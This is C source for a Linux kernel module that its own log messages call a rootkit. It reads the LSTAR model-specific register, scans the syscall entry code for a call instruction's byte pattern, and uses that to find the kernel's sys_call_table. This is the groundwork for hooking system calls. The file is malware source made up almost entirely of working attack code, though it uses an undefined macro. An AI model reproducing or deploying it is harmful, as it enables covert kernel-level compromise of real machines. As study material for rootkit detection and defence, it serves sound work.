#include <linux/module.h>
#include <linux/kernel.h>

typedef unsigned long fnPtr;

#define arch_ptr_inc(ptr) ((char *) (ptr) + 1)

#define FINGERPRINT "\xff\x14\xc5" // call QWORD PTR [rax * 8 + addr]
#define FINGERPRINT_LENGTH 3

fnPtr* sys_call_table;

/**
 *  Parse the instructions buffer to find the fingerprint for: call QWORD PTR [rax*8 + sys_call_table]
 *  ff 14 c5 [ e0 01 e0 bc ]
 *
 *  @param {void *} buffer
 *  @param {void *} fingerprint
 *  @param {uint32_t} fingerprint length
 *  @param {uint32_t} maximum kernel memory offset
 *  @return {void *}
 */
void* find_fingerprint(void* buffer, void* fingerprint, uint32_t f_length, uint32_t max_length) {
    register int off = 0;
    register int f_off = 0;

    char* casted_f = (char *) fingerprint;
    char* casted_buf = (char *) buffer;

    // Iterate through the kernel buffer memory
    for ( off = 0; off < max_length; off++ ) {

        // Fetch from the current offset
        for ( f_off = 0; f_off < f_length; f_off++ ) {

            // If fingerprint char doesn't match
            if ( casted_buf[off + f_off] != casted_f[f_off] )
                break;
        }

        // We readed whole fingerprint at off
        if ( f_off == f_length )
            return &casted_buf[off];
    }

    return NULL;
}

/**
 *  Read SYSENTER/SYSCALL instruction entrypoint from IA32_LSTAR model-specific register.
 *
 *  @return {void *}
 */
fnPtr* read_msr_syscall_entry(void) {
    register int high_order asm("edx");
    register int low_order asm("eax");
    unsigned long syscall_entry = 0x0;
    int msr_reg = 0xc0000082; // LSTAR_MSR


    asm ( "rdmsr" : : "c" (msr_reg) ); // Read MSR

    printk(KERN_INFO "rdmsr put 0x%x in edx, 0x%x in eax", high_order, low_order);

    syscall_entry = (ARCH_FUNCTION_POINTER) high_order;
    syscall_entry <<= 32;
    syscall_entry |= (ARCH_FUNCTION_POINTER) low_order;

    return (fnPtr *) syscall_entry;
}

/**
 *  Find the fingerprint of call QWORD PTR [rax * 8 + addr] followed by a valid kernel virtual address.
 *
 *  @param {void *} entrypoint
 *  @param {uint32_t} max_offset
 *  @return {void *}
 */
void* find_call_addr(void* entrypoint, uint32_t max_offset) {
    uint32_t current_offset = 0;
    void* call_addr;

    while ( current_offset < max_offset ) {
        call_addr = find_fingerprint(entrypoint, FINGERPRINT, FINGERPRINT_LENGTH, max_offset - FINGERPRINT_LENGTH); // Read at most max_offset bytes

        if ( call_addr == NULL ) {
            printk(KERN_INFO "Unable to find call fingerprint. Abort.\n");
            return NULL;
        }

        /* virt_addr validity check */
        if ( virt_addr_valid(call_addr) ) {
            return call_addr;
        }

        printk(KERN_INFO "Found something but the address is wrong :/, looking further...\n");

        current_offset = call_addr - entrypoint; // Increment offset
        entrypoint = arch_ptr_inc(call_addr); // Set the new entrypoint to previous found + 1 (to avoid same hit)
    }

    return NULL;
}

fnPtr* find_sys_call_table() {
    fnPtr* lstar_msr_read;
    fnPtr* table;
    char* call_addr;

    /* Reading LSTAR_MSR */
    lstar_msr_read = read_msr_syscall_entry();

    call_addr = find_call_addr(lstar_msr_read, 512);
    if ( call_addr == NULL )
        return call_addr;

    table = (fnPtr *) ( 0xFFFFFFFF00000000 | *(uint32_t *) ( call_addr + 3 ) );
    return table;
}

int init_module(void) {
    sys_call_table = find_sys_call_table();

    printk(KERN_INFO "rootkit entrypoint.\n");

    printk(KERN_INFO "sys_call_table at %p\n", sys_call_table);

    return 0;
}

void cleanup_module(void) {
    printk(KERN_INFO "Exiting rootkit.\n");
}

MODULE_LICENSE("GPL");
